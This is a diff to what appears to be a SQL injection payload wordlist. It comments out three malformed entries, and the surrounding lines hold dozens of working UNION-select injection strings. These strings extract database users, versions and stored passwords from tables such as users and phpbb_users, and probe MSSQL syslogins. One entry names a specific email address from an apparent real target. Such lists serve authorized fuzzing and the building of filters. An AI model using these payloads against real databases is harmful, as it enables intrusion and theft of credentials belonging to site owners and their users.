@@ -7975,7 +7975,7 @@
 -3048 union select 1,concat_ws(0x3b,pass,user()),3,4,5,6,7,8,9,10,11,12,13 from users--
 -304 and 1=2 union select 1,2,3,4,5,6,unhex(hex(concat_ws(0x3a,user(),database(),@@version))),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--
 -304 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15;
-304 union select1,2,3,4,%String_Col%,6,7,8,9--
+##304 union select1,2,3,4,%String_Col%,6,7,8,9--
 -304 union select 1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
 -30545 union select 1,concat(login,char(58),pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43 from users limit 1,1/*
 30554 union select 1,2,database() -- 
@@ -13820,7 +13820,7 @@ contaAct' union select 1,2,3,4,5,6,7,8,9,10,user() from information_schema.table
 cont'union select 1,2,3,user()/*
 convert(int,db_name() COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
 convert(numeric,(select max(dbname) from master..syslogins))--
-"cookie_reg=-101union select version()--
+##"cookie_reg=-101union select version()--
 c'  order by 99
 -CSKA') union select 1,2,3,4,5,6,concat_ws(0x3a,user(),version(),database()),8,9/*
 current' union select 1,2,3,4,concat_ws(0x3a,username,user_password),6,7,8,9,10,12,13,14,15,16,17,18,19,20,21,22,23 from phpbb_users limit 1,1-- 
@@ -14004,7 +14004,7 @@ title and 1=0 /*!union*/ select 1,2,3,4,concat_ws(0x0b,version(),user(),database
 twitch_hiscores' and 1=2 union select 1,2,3,4,concat_ws(0x3a,user(),version(),database()),6,7,8,9,10,11-- 
 u.-1 UNION SELECT concat_ws(0x3a,user() ,database(),version(),@@version_compile_os),2/*
 UK5666' and 1=0 or 1=(select top 1 name from sysusers) -- 
-unfathomable number-999.9 union select 1,2,3,4-
+## unfathomable number-999.9 union select 1,2,3,4-
 ## */ union
 ' union select 0,concat(id,char(58),login,char(58),email,char(58),pswd,char(58),is_user),2,3,4 from _user where email='info@artnow.ru'/*
 ' union select 1/*
